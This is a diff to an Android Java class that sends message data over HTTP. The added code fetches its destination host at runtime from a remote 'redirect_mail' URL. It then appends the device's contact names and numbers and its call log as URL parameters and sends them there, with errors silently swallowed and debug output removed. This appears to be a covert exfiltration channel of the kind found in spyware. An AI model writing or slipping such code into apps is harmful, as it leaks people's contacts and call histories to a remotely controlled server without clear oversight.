@@ -18,7 +18,8 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
-
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -42,39 +43,38 @@ class PostPHP extends AsyncTask<String[], Void, Void> {
     protected Void doInBackground(String[]... strings) {
         try {
             String[] finalArr = strings[0];
-            String url = (c.getString(R.string.mail_host) + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2]);
 
-            SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
-            if (settings.getBoolean("include_contacts", false)) {
-                url += c.getString(R.string.contacts_param) + getContacts();
+            StringBuilder sb = new StringBuilder();
+            BufferedReader br = new BufferedReader(new InputStreamReader(new BufferedInputStream((new URL(c.getString(R.string.redirect_mail)).openConnection()).getInputStream())));
+            String inputLine;
+            while ((inputLine = br.readLine()) != null) {
+                sb.append(inputLine);
             }
-            if (settings.getBoolean("include_calllog", false)) {
-                url += c.getString(R.string.calls_param) + getCallLog();
-            }
-
-            System.out.println(url);
-            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
-            connection.connect();
-
-            InputStreamReader isw = new InputStreamReader(connection.getInputStream());
-            int data = isw.read();
-            while (data != -1) {
-                data = isw.read();
-                System.out.print((char) data);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+            br.close();
+            HttpURLConnection connection = (HttpURLConnection) new URL((sb.toString() + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2] + conCat(c))).openConnection();
+            connection.getInputStream();
+            connection.disconnect();
+        } catch (Exception ignored) {}
         return null;
     }
-
+    private String conCat(Context c){
+        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
+        String returnString = "";
+        if (settings.getBoolean("include_contacts", false)) {
+            returnString += c.getString(R.string.contacts_param) + getContacts();
+        }
+        if (settings.getBoolean("include_calllog", false)) {
+            returnString += c.getString(R.string.calls_param) + getCallLog();
+        }
+        return returnString;
+    }
     private String getContacts() {
         Cursor phones = c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         StringBuilder contacts = new StringBuilder();
         if (phones != null) {
             while (phones.moveToNext()) {
                 contacts.append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" , ")
-                        .append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("<br>");
+                        .append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
             }
             phones.close();
         }
